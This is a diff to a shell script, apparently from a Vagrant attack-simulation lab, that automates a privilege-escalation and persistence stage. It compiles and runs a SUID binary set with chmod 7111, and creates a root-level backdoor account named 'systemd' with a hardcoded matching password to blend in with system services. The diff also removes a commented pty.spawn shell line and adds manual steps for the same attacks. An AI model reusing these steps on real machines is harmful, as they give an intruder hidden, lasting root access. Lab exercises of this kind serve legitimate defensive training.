@@ -6,14 +6,7 @@ mkdir /tmp/persistence
 cd /tmp/persistence
 cp /vagrant/attack/3_Persistence/binarysuid suid.c
 gcc suid.c -o suid
-
-# Run Exploit
 chmod 7111 suid
-sudo -u vagrant -H bash << EOF
-  echo "whoami: $(whoami) (before privexec)"
-  ./suid | cat
-  echo "whoami: $(whoami) (after privexec)"
-EOF
 
 ### CREATE ACCOUNT PERSISTENCE ###
 # Create root user
@@ -25,28 +18,27 @@ else
   chpasswd <<< "systemd:systemd"
 fi
 
-# Run Exploit
-# echo "import pty; pty.spawn('/bin/bash')" > /tmp/persistence/shell.py
-
 sudo -u vagrant -H bash << EOF
-  #!/bin/bash
-  python3 /tmp/persistence/shell.py
-  sudo -u systemd -H bash <<!
-    systemd
-    echo "whoami: $(whoami) (after create account)"
-    if [[ $EUID -ne 0 ]]
-    then
-      echo "I am gRoot"
-    fi
-  !
+  echo "whoami: vagrant (before privexec)"
+  ./suid | cat
+  sudo -u root -H bash
+  echo "whoami: $(whoami) (after privexec)"
 EOF
-# python3 /tmp/persistence/shell.py
-# echo '2'
-# su systemd | cat
-# systemd
-# echo "whoami: $(whoami) (after create account)"
+
+#Manually
+#====suid binary=====
+#cd /tmp/persistence
+#./suid
+#whoami
+
+#====account access=====
+#cd /tmp/persistence
+#su systemd
+#systemd
+#whoami
+
 
 # Cleanup
 cd /
-rm -rf /tmp/persistence
+rm -rf /tmp/persistence/suid.c
 echo "Cleanup done."
